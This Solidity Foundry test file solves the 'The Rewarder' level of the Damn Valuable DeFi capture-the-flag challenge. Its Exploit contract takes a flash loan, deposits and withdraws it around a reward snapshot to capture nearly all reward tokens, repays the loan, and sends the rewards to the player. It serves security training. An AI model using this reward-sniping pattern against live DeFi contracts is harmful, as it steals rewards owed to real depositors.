// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

contract TheRewarder is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal rewarderPool;
    RewardToken internal rewardToken;
    AccountingToken internal accountingToken;
    DamnValuableToken internal liquidityToken;
    address payable[] internal users;
    address[4] internal depositors;
    address payable internal player;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        player = users[4];

        depositors = [alice, bob, charlie, david];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(player, "Player");


        liquidityToken = new DamnValuableToken();
        vm.label(address(liquidityToken), "Liquidity Token");

        flashLoanerPool = new FlashLoanerPool(address(liquidityToken));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        liquidityToken.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        rewarderPool = new TheRewarderPool(address(liquidityToken));
        rewardToken = rewarderPool.rewardToken();
        accountingToken = rewarderPool.accountingToken();

        // Check roles in accounting token
        assertEq(accountingToken.owner(), address(rewarderPool));
        uint256 minterRole = accountingToken.MINTER_ROLE();
        uint256 snapshotRole = accountingToken.SNAPSHOT_ROLE();
        uint256 burnerRole = accountingToken.BURNER_ROLE();
        assert(accountingToken.hasAllRoles(address(rewarderPool), minterRole | snapshotRole | burnerRole) == true);


       // Alice, Bob, Charlie and David deposit tokens
        for (uint8 i; i < depositors.length; i++) {
            liquidityToken.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            liquidityToken.approve(address(rewarderPool), USER_DEPOSIT);
            rewarderPool.deposit(USER_DEPOSIT);
            assertEq(accountingToken.balanceOf(users[i]), USER_DEPOSIT);
            vm.stopPrank();
        }

        assertEq(accountingToken.totalSupply(), USER_DEPOSIT * depositors.length);
        assertEq(rewardToken.totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        // Each depositor gets reward tokens
        uint256 rewardsInRound = rewarderPool.REWARDS();
        for (uint8 i; i < depositors.length; i++) {
            vm.prank(users[i]);
            rewarderPool.distributeRewards();
            assertEq(
                rewardToken.balanceOf(users[i]),
                rewardsInRound/(depositors.length) // Each depositor gets 25 reward tokens
            );
        }

        assertEq(rewardToken.totalSupply(), rewardsInRound);

        // Player starts with zero DVT tokens in balance
        assertEq(liquidityToken.balanceOf(player), 0); 

        // Two rounds should have occurred so far
        assertEq(rewarderPool.roundNumber(), 2); 

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

         // Advance time 5 days so that depositors can get rewards. Can also advance it after depositing. Both are valid
        vm.warp(block.timestamp + 5 days); // 5 days

        vm.startPrank(player);

        Exploit exploit = new Exploit(rewarderPool, flashLoanerPool, liquidityToken, rewardToken);
        exploit.flashLoan(TOKENS_IN_LENDER_POOL);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Only one round should have taken place
        assertEq(rewarderPool.roundNumber(), 3); 

        // Users should get negligible rewards this round
        for (uint8 i; i < depositors.length; i++) {
            vm.prank(users[i]);
            rewarderPool.distributeRewards();
            uint256 rewardPerUser = rewardToken.balanceOf(users[i]);
            uint256 delta = rewardPerUser - (rewarderPool.REWARDS()/(depositors.length));
            assertLt(delta, 1e16);
        }

        // Rewards must have been issued to the attacker account
        assertGt(rewardToken.totalSupply(), rewarderPool.REWARDS());
        uint256 playerRewards = rewardToken.balanceOf(player);
        assertGt(playerRewards, 0);

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = rewarderPool.REWARDS() - playerRewards;
        assertLt(deltaAttacker, 1e17);

        /// Balance of DVT tokens in player and lending pool hasn't changed
        assertEq(liquidityToken.balanceOf(player), 0);
        assertEq(
            liquidityToken.balanceOf(address(flashLoanerPool)),
        TOKENS_IN_LENDER_POOL);
    }
}

contract Exploit{

    TheRewarderPool rewardPool;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    address owner;

    constructor(TheRewarderPool _rewardPool, FlashLoanerPool _flashLoanPool, DamnValuableToken _liquidityToken, RewardToken _rewardToken) {
        owner = msg.sender;
        rewardPool = _rewardPool;
        flashLoanPool = _flashLoanPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function flashLoan(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}